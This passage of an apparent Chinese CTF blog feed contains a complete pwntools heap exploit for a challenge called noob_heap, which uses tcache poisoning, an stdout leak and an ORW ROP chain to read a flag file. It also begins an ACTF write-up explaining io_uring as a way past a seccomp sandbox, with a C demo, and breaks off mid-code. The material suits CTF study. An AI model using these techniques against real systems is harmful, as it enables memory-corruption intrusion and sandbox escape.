class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./noob_heap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x78</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x78</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">5</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#1-6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7-24</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i+<span class="hljs-number">7</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0-6</span><br><br>add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7</span><br>show(<span class="hljs-number">7</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0f0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x910</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>edit(<span class="hljs-number">10</span>, p64((heap_base + <span class="hljs-number">0x790</span>))*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">9</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">14</span>,p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>))<br><br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret_addr = stack - <span class="hljs-number">0x138</span> - <span class="hljs-number">0x60</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">14</span>,p64(ret_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>pop_rsi = <span class="hljs-number">0x0000000000160498</span> + libc.address<br>pop_rdx = <span class="hljs-number">0x00000000000796a2</span> + libc.address<br>lea_ret = <span class="hljs-number">0x000000000004da83</span> + libc.address<br>orw = flat([<br>    pop_rdi,ret_addr,<br>    pop_rsi,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">3</span>,<br>    pop_rsi,heap_base+<span class="hljs-number">0x300</span>,<br>    pop_rdx,<span class="hljs-number">0x40</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],<br>])<br>edit(<span class="hljs-number">0</span>,orw)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(lea_ret) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(heap_base+<span class="hljs-number">0x7a0</span>-<span class="hljs-number">8</span>) + p64(lea_ret))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF</title>
    <link href="/2023/10/31/ACTF/"/>
    <url>/2023/10/31/ACTF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>👴有罪</p><p>👴这次爆零了</p><p>回想几个月前remakeACTF2022，唯一一道remake出来的tree_pwn还是看Nameless👴的博客搓的。</p><p>不得不感叹AAA的师傅出题是真有水平，没有奇怪的脑洞，全是干货。</p><p>但这和我一道都做不出有什么关系呢，悲</p><p>😭😭😭😭😭</p><p>没有能力的人是只能赛后remake的，是没有资格享受解题的激动与喜悦的</p><p>哎，屑korey这篇remake会写的尽量详细。</p><p>真的要得玉玉症了呜呜呜</p><h1 id="0x1：Pwn-remake🤣"><a href="#0x1：Pwn-remake🤣" class="headerlink" title="0x1：Pwn remake🤣"></a>0x1：Pwn remake🤣</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>你是master🐎，反正👴不是</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>能直接执行输入的shellcode，但是，我要说但是，本题开了一个及其离谱的沙盒：</p><p><img src="/img/ACTF/0.png" alt="img"></p><p>把<code>open read write</code>及其替代品是全kill了</p><p>👴当时想的是<code>clone、fork、ptrace、lseek</code>这些都没禁，想用<code>ptrace</code>来着，后来仔细一想我真tm是个SB啊，无论是<code>fork</code>还是<code>clone</code>，创建那个新进程时sandbox已经被调用了。</p><p>然后就没有然后了，👴又想找找有没有<code>open read</code>的漏网之鱼，打个测信道，然后也没有了下文。</p><p>👴开摆了，反正👴不是master就不是吧（bushi）</p><p>比赛结束后，Nightu👴说这题一眼看出<code>io_uring</code></p><p>PS：👴当时的反应：这又是哪个🐔8玩意，怎么人与人的差别比人与狗的都大，妈妈生的</p><p>然后👴就去找资料了解<code>io_uring</code>了</p><h3 id="What-‘s-io-uring"><a href="#What-‘s-io-uring" class="headerlink" title="What ‘s io_uring"></a>What ‘s io_uring</h3><p><code>io_uring</code>是<code>linux</code>从内核版本5.1开始引入的高性能异步I&#x2F;O框架</p><p>具体的可以看<a href="https://arthurchiao.art/blog/intro-to-io-uring-zh/#25-io_uring-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-api">这个</a></p><p>这边主要说一下和题目相关的</p><p>因为👴一直用CSDN上的祖传调用表，对于这三个调用号在400多的 👴是真的没印象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">三个系统调用<br>io_uring_setup<br>io_uring_register<br>io_uring_enter<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/1.png" alt="img"></p><p>其中<code>io_uring_setup</code> + <code>io_uring_enter</code>就可以完成绝大部分I&#x2F;O操作。</p><h4 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup"></a>io_uring_setup</h4><p>先用<code>io_uring_setup</code>设置异步I&#x2F;O操作的上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_setup</span><span class="hljs-params">(u32 entries, <span class="hljs-keyword">struct</span> io_uring_params *p)</span>;<br></code></pre></td></tr></table></figure><ul><li>创建一个 SQ(<code>submission queu</code>e, 提交队列) 和一个 CQ(<code>completed queue</code>,完成队列）</li><li><code>queue size</code> 至少 <code>entries</code> 个元素，</li><li>返回一个文件描述符，随后用于在这个 <code>io_uring</code> 实例上执行操作。</li></ul><p>SQ 和 CQ 在应用和内核之间共享，避免了在初始化和完成 I&#x2F;O 时<code>（initiating and completing I/O）</code>拷贝数据。</p><p>参数 p：</p><ul><li>应用用来配置 <code>io_uring</code>，</li><li>内核返回的 SQ&#x2F;CQ 配置信息也通过它带回来。</li></ul><p><code>io_uring_setup()</code> 成功时返回一个文件描述符<code>（fd）</code>。</p><p>应用随后可以将这个 fd 传给 <code>mmap(2)</code> 系统调用，来 <code>map the submission and completion queues</code> 或者传给 <code>to the io_uring_register() or io_uring_enter() system calls</code>.</p><h4 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter"></a>io_uring_enter</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_enter</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> to_submit, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> min_complete, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">sigset_t</span> *sig)</span>;<br></code></pre></td></tr></table></figure><p>这个系统调用用于初始化和完成<code>（initiate and complete）</code>I&#x2F;O，使用共享的 SQ 和 CQ。 单次调用同时执行：</p><ol><li>提交新的 I&#x2F;O 请求</li><li>等待 I&#x2F;O 完成</li></ol><p>参数：</p><ol><li><code>fd</code> 是 <code>io_uring_setup()</code> 返回的文件描述符；</li><li><code>to_submit</code> 指定了 SQ 中提交的 I&#x2F;O 数量；</li></ol><p><code>io_uring_enter()</code> 支持很多操作，包括：</p><ul><li>Open, close, and stat files</li><li>Read and write into multiple buffers or pre-mapped buffers</li><li>Socket I&#x2F;O operations</li><li>Synchronize file state</li><li>Asynchronously monitor a set of file descriptors</li><li>Create a timeout linked to a specific operation in the ring</li><li>Attempt to cancel an operation that is currently in flight</li><li>Create I&#x2F;O chains</li><li>Ordered execution within a chain</li><li>Parallel execution of multiple chains</li></ul><p>具体的demo可以让chatgpt帮忙写一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">4</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后可以进GDB看看发生了什么</p><p>可以看到<code>io_uring_queue_init_params</code>实际是<code>io_uring_setup</code>和两个<code>mmap</code>的封装</p><p><code>io_uring_setup</code>执行后返回fd &#x3D; 3</p><p><img src="/img/ACTF/2.png" alt="img"></p><p>两个<code>mmap</code>有所不同，这个等会再讲</p><p><img src="/img/ACTF/3.png" alt="img"></p><p><img src="/img/ACTF/4.png" alt="img"></p><p>设第一个mmap出来的内存地址为<code>mmap_address1</code>，第二个mmap出来的内存地址为<code>mmap_address2</code></p><p><code>io_uring_prep_openat</code>和<code>io_uring_sqe_set_flags</code>实则在对<code>mmap_address2</code>处的sqe结构体进行设置</p><p>后面的<code>io_uring_prep_read/write</code>也是如此</p><p>翻看源码，sqe结构体具体是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> &#123;</span><br>__u8opcode;<span class="hljs-comment">/* type of operation for this sqe */</span><br>__u8flags;<span class="hljs-comment">/* IOSQE_ flags */</span><br>__u16ioprio;<span class="hljs-comment">/* ioprio for the request */</span><br>__s32fd;<span class="hljs-comment">/* file descriptor to do IO on */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64off;<span class="hljs-comment">/* offset into file */</span><br>__u64addr2;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32cmd_op;<br>__u32__pad1;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64addr;<span class="hljs-comment">/* pointer to buffer or iovecs */</span><br>__u64splice_off_in;<br>&#125;;<br>__u32len;<span class="hljs-comment">/* buffer size or number of iovecs */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">__kernel_rwf_t</span>rw_flags;<br>__u32fsync_flags;<br>__u16poll_events;<span class="hljs-comment">/* compatibility */</span><br>__u32poll32_events;<span class="hljs-comment">/* word-reversed for BE */</span><br>__u32sync_range_flags;<br>__u32msg_flags;<br>__u32timeout_flags;<br>__u32accept_flags;<br>__u32cancel_flags;<br>__u32open_flags;<br>__u32statx_flags;<br>__u32fadvise_advice;<br>__u32splice_flags;<br>__u32rename_flags;<br>__u32unlink_flags;<br>__u32hardlink_flags;<br>__u32xattr_flags;<br>__u32msg_ring_flags;<br>__u32uring_cmd_flags;<br>&#125;;<br>__u64user_data;<span class="hljs-comment">/* data to be passed back at completion time */</span><br><span class="hljs-comment">/* pack this to avoid bogus arm OABI complaints */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* index into fixed buffers, if used */</span><br>__u16buf_index;<br><span class="hljs-comment">/* for grouped buffer selection */</span><br>__u16buf_group;<br>&#125; __attribute__((packed));<br><span class="hljs-comment">/* personality to use, if used */</span><br>__u16personality;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__s32splice_fd_in;<br>__u32file_index;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16addr_len;<br>__u16__pad3[<span class="hljs-number">1</span>];<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u64addr3;<br>__u64__pad2[<span class="hljs-number">1</span>];<br>&#125;;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span><br><span class="hljs-comment"> * this field is used for 80 bytes of arbitrary command data</span><br><span class="hljs-comment"> */</span><br>__u8cmd[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在程序中leak这个结构体康康</p><p><img src="/img/ACTF/5.png" alt="img"></p><p>发现是吻合的</p><p>至于<code>io_uring_submit</code>，则是<code>io_uring_enter</code>的封装</p><p><img src="/img/ACTF/6.png" alt="img"></p><p>OK，Poc分析完毕</p><h3 id="试图手搓shellcode"><a href="#试图手搓shellcode" class="headerlink" title="试图手搓shellcode"></a>试图手搓shellcode</h3><p>笔者觉得总的流程就是<code>syscall_io_uring_setup</code>初始化上下文，两个<code>syscall_mmap</code>，设置好sqe结构体后<code>syscall_io_uring_enter</code>提交<code>submisson</code>。</p><p>But，笔者怎么搓都打不通呜呜呜&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>这边放上笔者的失败品，如果有master搓通了能不能教教弟弟呜呜。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 